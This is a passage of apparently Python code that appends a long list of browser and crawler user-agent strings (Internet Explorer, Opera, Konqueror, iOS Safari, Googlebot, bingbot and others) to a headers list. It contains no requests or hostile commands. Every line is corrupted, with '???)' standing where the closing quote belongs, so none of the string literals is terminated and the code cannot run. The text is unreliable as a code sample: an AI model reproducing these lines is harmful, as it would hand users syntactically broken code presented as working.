    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; AOL 7.0; Windows 98)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; FunWebProducts)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; .NET CLR 1.1.4322; MSN 9.0;MSN 9.1; MSNbMSNI; MSNmen-us; MSNcIA; MPLUS)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; YPC 3.2.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 2.0.50727)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.50???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Maxthon; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; .NET CLR 1.0.3705)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; FunWebProducts; HbTools 4.7.5)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.53???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; SV1)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; HbTools 4.7.5)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; iebar; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon; SV1; FDM)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; sbcydsl 3.12; YComp 5.0.0.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.02b)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312469)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Tablet PC 1.7)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; EnergyPlugIn; dial)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; BUILDWARE 1.6; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Ringo; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; snprtz|S04741035500914#914|isdn; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.0.1; .NET CLR 1.1.4322; yplus 4.1.00b)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.2.0; (R1 1.5)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; YComp 5.0.0.0; SV1; .NET CLR 1.0.3705)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {59FC8AE0-2D88-C929-DA8D-B559D01826E7}; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; de) Opera 8.53???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; it)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; InfoPath.2)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Acoo Browser; InfoPath.2; .NET CLR 2.0.50727; Alexa Toolbar)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5;???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; Maxthon; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6???)
    headers.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB6; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB5; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)???)
    headers.append("Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)???)
    headers.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)???)
    headers.append("Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16???)
    headers.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)???)
    headers.append("Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0???)
    headers.append("Mozilla/4.0 (PSP (PlayStation Portable); 2.00)???)
    headers.append("Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)???)
    headers.append("Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)???)
    headers.append("Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)???)
    headers.append("Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)???)
    headers.append("Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)???)
    headers.append("Mozilla/4.04 [en] (WinNT; I)???)
    headers.append("Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]???)
    headers.append("Mozilla/4.5 [de] (Macintosh; I; PPC)???)
    headers.append("Mozilla/4.8 [en] (Windows NT 5.1; U)???)
    headers.append("Mozilla/4.8 [en] (X11; U; IRIX64 6.5 IP27)???)
    headers.append("Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)???)
    headers.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)???)
    headers.append("Mozilla/4.76 [en] (X11; U; SunOS 5.8 sun4m)???)
    headers.append("Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)???)
    headers.append("Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1???)
    headers.append("Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1???)
    headers.append("Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3???)
    headers.append("Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a???)
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1 (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1???)
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+???)
    headers.append("Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+???)
    headers.append("Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko???)
    headers.append("Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620???)
    headers.append("Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)???)
    headers.append("Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)???)
    headers.append("Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)???)
    headers.append("Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)???)
    headers.append("Mozilla/5.0 (compatible; bingbot/2.0 http://www.bing.com/bingbot.htm)???)
    headers.append("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)???)
    headers.append("Mozilla/5.0 (compatible; Exabot/3.0; http://www.exabot.com/go/robot)???)
    headers.append("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)???)
    headers.append("Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.2; Linux)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.4; Linux 2.6.14-kanotix-9; X11)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.4; Linux) KHTML/3.4.3 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/3; Linux)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.1; DragonFly) KHTML/4.1.4 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.3; Linux) KHTML/4.3.1 (like Gecko) Fedora/4.3.1-3.fc11???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)???)
    headers.append("Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0???)
    headers.append("Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)???)
    headers.append("Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)???)
    headers.append("Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)???)
    headers.append("Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)???)
    headers.append("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)???)
    headers.append("Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)???)
    headers.append("Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )???)
    headers.append("Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36???)
    headers.append("Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Web Preview) Version/3.1 Safari/525.13???)
    headers.append("Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0???)
    headers.append("Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3???)
    headers.append("Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25???)
    headers.append("Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4???)
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10???)
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5???)
    headers.append("Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5???)
    headers.append("Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1???)
    headers.append("Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1???)
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1???)
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1???)
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1???)
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1???)
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1???)
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200???)
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16???)
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/531.22.7???)
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5???)
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190???)
    headers.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)???)
    headers.append("Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420 (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3???)
    headers.append("Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11a Safari/525.20???)
    headers.append("Mozilla/5.0 (iPod; U; CPU iPhone OS 3_1_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7C145???)
